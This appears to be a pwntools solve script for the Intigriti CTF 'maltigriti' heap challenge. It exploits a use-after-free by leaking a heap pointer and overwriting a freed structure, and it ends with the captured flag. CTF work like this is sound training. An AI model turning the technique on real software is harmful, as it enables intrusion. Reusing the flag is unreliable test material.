#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./maltigriti")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("maltigriti.ctf.intigriti.io", 1337)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.sendlineafter(b'menu> ', b'0')
	r.sendlineafter(b'name> ', b'AAA')
	r.sendlineafter(b'password> ', b'AAA')
	r.sendlineafter(b'bio> ', b'192')
	r.sendlineafter(b'bio> ', b'hi')
	r.sendlineafter(b'menu> ', b'6')
	
	r.sendlineafter(b'menu> ', b'2')
	r.sendlineafter(b'title> ', b'title')
	r.sendlineafter(b'report> ', b'body')
	
	r.sendlineafter(b'menu> ', b'1')
	r.recvuntil(b'is: ')
	user_leak = u64(r.recv(6).ljust(8, b'\x00'))
	success(f'{hex(user_leak)=}')
	r.sendlineafter(b'bio>', p64(user_leak) + p64(ord('A')) + p64(2000))
	r.sendlineafter(b'menu> ', b'5')

	r.interactive()


if __name__ == "__main__":
	main()

# INTIGRITI{u53_4f73r_fr33_50und5_600d_70_m3}
